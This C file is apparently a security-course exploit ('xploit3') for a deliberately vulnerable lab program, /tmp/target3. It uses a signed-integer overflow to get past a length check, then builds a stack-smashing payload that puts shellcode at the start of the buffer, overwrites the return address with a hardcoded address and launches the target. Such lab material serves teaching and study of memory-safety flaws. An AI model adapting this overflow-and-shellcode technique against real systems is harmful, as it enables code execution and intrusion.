#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target3"
#define DEFAULT_FILE "/tmp/xploit3_output"


// Address of the buffer we are planning to overflow (found by running modified target multiple times)
#define BUFFER_ADDRESS 0x00007ffffffe6068

// Smallest possible negative number - it will help tricking the check on line 17
#define STILL_LONG 0x8000000000000000

// Size of "widget" array (in units)
#define ARRAY_LENGTH 1500

// Size of "widget" structure (in bytes)
#define WIDGET_SIZE 24

// Exploit overhead - maximum number of bytes that will be taken by number field
#define OVERHEAD 100


int main(void) {
  // Number (base 10), "widget" array length and two more pointers
  size_t exploit_size = OVERHEAD + ARRAY_LENGTH * WIDGET_SIZE + sizeof(void*) * 2;
  char* exploit = malloc(exploit_size);

  // This number will be considered to be negative on line 17 and will turn positive (because of overflow) on line 18
  int num_end = sprintf(exploit, "%ld,", (long) (STILL_LONG + ARRAY_LENGTH + 1));

  // Fill all the buffer with zeros
  int return_ptr = num_end + ARRAY_LENGTH * WIDGET_SIZE + sizeof(void*);
  memset(&exploit[num_end], 0, return_ptr - num_end);

  // Put the buffer address right after it - where return address should be stored
  void* address = (void*) BUFFER_ADDRESS;
  memcpy(&exploit[return_ptr], &address, sizeof(void*));

  // Put shell code to the beginning of the buffer - right after the number part
  memcpy(&exploit[num_end], shellcode, sizeof(shellcode) - 1);

  // Write the exploit buffer to a file
  write_xploit(exploit, exploit_size, DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
